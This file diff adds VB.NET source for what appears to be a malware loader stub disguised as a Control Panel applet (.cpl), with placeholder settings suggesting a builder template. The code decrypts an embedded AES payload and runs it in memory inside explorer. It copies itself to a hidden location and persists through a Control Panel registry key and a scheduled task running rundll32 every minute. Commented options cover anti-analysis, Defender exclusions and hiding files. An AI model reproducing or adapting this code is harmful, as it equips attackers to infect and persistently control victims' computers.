@@ -1,0 +1,164 @@
+﻿Imports System.IO
+Imports System.Management
+Imports System.Reflection
+Imports System.Runtime.InteropServices
+Imports System.Security.Cryptography
+Imports System.Threading
+
+Public Class Test
+
+    <DllExport("CPlApplet", CallingConvention:=CallingConvention.StdCall)>
+    Public Shared Function CPlApplet() As Boolean
+        While True
+
+            Dim defaultStdout As IntPtr = New IntPtr(7)
+            Dim currentStdout As IntPtr = GetStdHandle(StdOutputHandle)
+
+            If Process.GetCurrentProcess.ProcessName.ToLower = "explorer" Then
+
+                CreateMutex()
+
+                Memory(AES_Decryptor(My.Resources.Buffer))
+
+            Else
+                Try
+
+                    'AntiAnalysi Analysis.RunAntiAnalysis()
+
+                    Dim Searcher As New ManagementObjectSearcher("SELECT * FROM Win32_Process WHERE ProcessId=" & Process.GetCurrentProcess.Id.ToString)
+                    For Each Proc As ManagementObject In Searcher.Get()
+
+                        For Each SPL In Strings.Split(Proc("CommandLine").ToString, """")
+                            If SPL.ToLower.EndsWith(".cpl") Then
+
+                                Dim Dir As String = New FileInfo(Settings.Directory & "\" & Settings.FileName).Directory.FullName
+                                Dim Dll As String = Dir & "\" & IO.Path.GetFileName(Settings.FileName)
+
+                                Try
+                                    If Not IO.Directory.Exists(Dir) Then
+                                        IO.Directory.CreateDirectory(Dir)
+                                    End If
+                                    IO.File.WriteAllBytes(Dll, IO.File.ReadAllBytes(SPL))
+                                Catch
+                                End Try
+
+
+                                'WDExclusion Exclusion.Exclusion(Dll)
+
+
+                                'SuperHidden Try
+                                'SuperHidden IO.File.SetAttributes(Dll, IO.FileAttributes.Hidden + IO.FileAttributes.System)
+                                'SuperHidden Dim Key As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", True)
+                                'SuperHidden If Key.GetValue("ShowSuperHidden") = 1 Then
+                                'SuperHidden    Key.SetValue("ShowSuperHidden", 0)
+                                'SuperHidden End If
+                                'SuperHidden Catch
+                                'SuperHidden End Try
+
+
+                                Try
+                                    Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree("Software\Microsoft\Windows\CurrentVersion\Control Panel")
+                                Catch
+                                End Try
+
+                                Try
+                                    Dim Obj As Object = CreateObject("WScript.Shell")
+                                    Obj.RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs", "Top level key")
+                                    Obj.RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs\" & IO.Path.GetFileNameWithoutExtension(Settings.FileName), Dll, "REG_SZ")
+                                Catch
+                                End Try
+
+
+                                Try
+                                    Dim PSInfo As New ProcessStartInfo("schtasks.exe")
+                                    PSInfo.WindowStyle = ProcessWindowStyle.Hidden
+                                    PSInfo.Arguments = ("/create /f /tn " & """" & IO.Path.GetFileNameWithoutExtension(Settings.FileName) & """" & " /sc minute /mo 1 /tr " & """" & "rundll32.exe " & "\" & """" & Dll & "\" & """" & ",%Runtime%" & """")
+                                    Dim PS As Process = Process.Start(PSInfo)
+                                    PS.WaitForExit()
+                                    Thread.Sleep(1000)
+                                    Shell("schtasks.exe /run /tn " & """" & IO.Path.GetFileNameWithoutExtension(Settings.FileName) & """", vbHide)
+                                Catch
+                                End Try
+
+                                Environment.Exit(0)
+
+                            End If
+                        Next
+                    Next
+                Catch
+                End Try
+                Exit While
+            End If
+            System.Windows.Forms.Application.Run()
+        End While
+        Return True
+    End Function
+
+    <DllExport("%Runtime%", CallingConvention:=CallingConvention.StdCall)>
+    Public Shared Function HiddenControl() As Boolean
+
+        If CreateMutex() Then
+
+            Try
+                Dim objShell As Object = CreateObject("Shell.Application")
+                objShell.ShellExecute("::{26EE0668-A00A-44D7-9371-BEB064C98683}", "", "", "open", 0)
+            Catch
+            End Try
+
+        End If
+
+    End Function
+    Public Shared Function AES_Decryptor(ByVal input As Byte()) As Byte()
+        Try
+            Dim AES As New RijndaelManaged
+            Dim Hash As New MD5CryptoServiceProvider
+            AES.Key = Hash.ComputeHash(SB(Settings.DecryptKey))
+            AES.Mode = CipherMode.ECB
+            Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
+            Dim Buffer As Byte() = input
+            Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
+        Catch
+        End Try
+    End Function
+    Public Shared Function SB(ByVal s As String) As Byte()
+        Return System.Text.Encoding.UTF8.GetBytes(s)
+    End Function
+    Public Shared Function Memory(ByVal buffer As Byte())
+        Try
+            Dim asm As Assembly = AppDomain.CurrentDomain.Load(buffer)
+            Dim Metinf As MethodInfo = asm.EntryPoint
+            Dim InjObj As Object = asm.CreateInstance(Metinf.Name)
+            Dim parameters As Object() = New Object(0) {}
+            If Metinf.GetParameters().Length = 0 Then parameters = Nothing
+            Metinf.Invoke(InjObj, parameters)
+        Catch
+        End Try
+    End Function
+
+    Public Shared _appMutex As Mutex
+    Public Shared Function CreateMutex() As Boolean
+        Dim createdNew As Boolean
+        _appMutex = New Mutex(False, Settings.DecryptKey, createdNew)
+        Return createdNew
+    End Function
+
+    Private Const StdOutputHandle As UInt32 = &HFFFFFFF5UI
+    <DllImport("kernel32.dll")>
+    Private Shared Function GetStdHandle(ByVal nStdHandle As UInt32) As IntPtr
+    End Function
+    <DllImport("kernel32.dll")>
+    Private Shared Sub SetStdHandle(ByVal nStdHandle As UInt32, ByVal handle As IntPtr)
+    End Sub
+    <DllImport("kernel32")>
+    Private Shared Function AllocConsole() As Boolean
+    End Function
+End Class
+
+
+Public Class Settings
+
+    Public Shared DecryptKey As String = "%KEY%"
+    Public Shared FileName As String = "%FileName%"
+    Public Shared Directory As String = Environment.ExpandEnvironmentVariables("%Path%")
+
+End Class
